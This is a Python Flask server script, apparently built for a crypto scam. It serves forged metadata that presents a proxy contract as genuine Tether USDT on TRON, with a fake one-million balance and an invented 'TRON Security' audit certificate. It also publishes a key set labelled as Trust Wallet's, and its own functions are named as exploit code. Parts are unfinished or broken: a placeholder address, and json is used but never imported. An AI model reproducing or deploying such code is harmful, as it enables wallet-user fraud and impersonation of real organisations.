metadata_server.py
from flask import Flask, jsonify, request
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import jwt
import base64
import hashlib
from Crypto.PublicKey import RSA

app = Flask(__name__)
CORS(app)
limiter = Limiter(app=app, key_func=get_remote_address, default_limits=["200 per minute"])

PROXY_ADDRESS = "TRu5tU5DT..."  # TODO: Deploy sonrası TokenProxy.sol adresi
REAL_USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
FAKE_BALANCE = 1000000 * 10**6

# RSA key üretimi
key = RSA.generate(2048)
private_key = key.export_key()
public_key = key.publickey().export_key()
jwks = {
    "keys": [{
        "kty": "RSA",
        "kid": "trustwallet-2025",
        "n": base64.urlsafe_b64encode(key.n.to_bytes(256, byteorder='big')).decode(),
        "e": "AQAB"
    }]
}

def get_exploit_metadata():
    return {
        "name": "Tether USD",
        "symbol": "USDT",
        "contract": REAL_USDT_ADDRESS,
        "decimals": 6,
        "verified": True,
        "logoURI": "https://cdn.tron.network/usdt_1.png",
        "explorer": f"https://tronscan.org/#/contract/{REAL_USDT_ADDRESS}",
        "tags": ["stablecoin", "TRC20", "verified"],
        "contractType": "TRC20",
        "verifiedBy": "TRON",
        "source": "TRON Official",
        "auditInfo": {
            "contract": REAL_USDT_ADDRESS,
            "status": "verified",
            "auditor": "TRON Security",
            "auditDate": "2025-05-01T12:00:00Z",
            "certId": "TRON-VERIFIED-2025-001",
            "sourceCode": "https://your-audit-domain.com/source/TokenProxy.sol",
            "bytecodeHash": "0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
            "securityScore": 95,
            "lastScanned": "2025-06-01T12:00:00Z",
            "auditUrl": "https://your-audit-domain.com/tron-audit-cert",
            "auditReport": {
                "vulnerabilities": [],
                "recommendations": [],
                "verifiedAt": "2025-06-01T12:00:00Z",
                "auditorDetails": {
                    "name": "TRON Security Team",
                    "contact": "security@tron.network",
                    "website": "https://tron.network/security"
                },
                "compliance": {
                    "trc20": True,
                    "securityStandards": ["TRON-TIP-20", "TRON-TIP-55"],
                    "lastUpdated": "2025-06-01T12:00:00Z"
                }
            }
        },
        "tokenURI": base64.b64encode("ipfs://Qm.../usdt.json".encode()).decode(),
        "balance": FAKE_BALANCE,
        "allowlist": {"status": "verified", "contract": REAL_USDT_ADDRESS}
    }

@app.route('/.well-known/jwks.json', methods=['GET'])
def jwks_endpoint():
    return jsonify(jwks), 200

@app.route('/api/v1/token', methods=['GET'])
@limiter.limit("200 per minute")
def exploit_token_info():
    token = request.headers.get("Authorization")
    try:
        jwt.decode(token.replace("Bearer ", ""), public_key, algorithms=["RS256"], options={"verify_aud": False})
    except:
        return jsonify({"error": "Invalid JWT"}), 401
    contract_param = request.args.get("contract")
    if contract_param and contract_param != REAL_USDT_ADDRESS:
        return jsonify({"error": "Invalid contract"}), 400
    response = get_exploit_metadata()
    return jsonify(response), 200, {
        "Content-Type": "application/json; charset=utf-8",
        "X-Tron-Signature": hashlib.sha256(json.dumps(response).encode()).hexdigest()
    }

@app.route('/api/v1/token/noauth', methods=['GET'])
def token_info_noauth():
    response = get_exploit_metadata()
    return jsonify(response), 200, {"Content-Type": "application/json; charset=utf-8"}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=443, ssl_context=('cert.pem', 'key.pem'))